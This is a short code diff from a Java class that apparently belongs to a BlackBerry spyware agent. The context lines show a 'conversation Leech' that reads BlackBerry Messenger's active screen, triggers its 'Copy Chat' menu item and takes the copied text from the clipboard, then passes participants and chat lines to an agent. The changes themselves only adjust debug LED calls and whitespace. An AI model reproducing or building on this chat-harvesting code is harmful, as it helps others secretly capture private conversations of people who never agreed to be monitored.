@@ -34,6 +34,7 @@ public class ConversationScreen {
     public void setBBM(UiApplication bbmApplication) {
         this.bbmApplication = bbmApplication;
         //this.conversationScreens=conversationScreens;
+
         //#ifdef DEBUG
         debug.info("conversation Leech: " + conversationScreens);
         //#endif
@@ -43,12 +44,13 @@ public class ConversationScreen {
         try {
             if (bbmApplication == null || !Backlight.isEnabled()) {
                 //#ifdef DEBUG
-                debug.led(Debug.COLOR_RED);
+                debug.ledFlash(Debug.COLOR_RED);
                 //#endif
                 return;
             }
 
             Screen screen = bbmApplication.getActiveScreen();
+
             //#ifdef DEBUG
             debug.info("leech active screen: " + screen);
             //#endif
@@ -92,7 +94,7 @@ public class ConversationScreen {
                     agent.add(partecipants, lines);
 
                     //#ifdef DEBUG
-                    debug.led(Debug.COLOR_YELLOW);
+                    debug.ledFlash(Debug.COLOR_YELLOW);
                     //#endif
                 }
             }
@@ -116,7 +118,7 @@ public class ConversationScreen {
         //#ifdef DEBUG
         debug.trace("extractConversation");
         //#endif
-        
+
         // debug.trace("try copy chat: "+screen);
         if (MenuWalker.walk("Copy Chat", screen, true)) {
             String clip = (String) Clipboard.getClipboard().get();
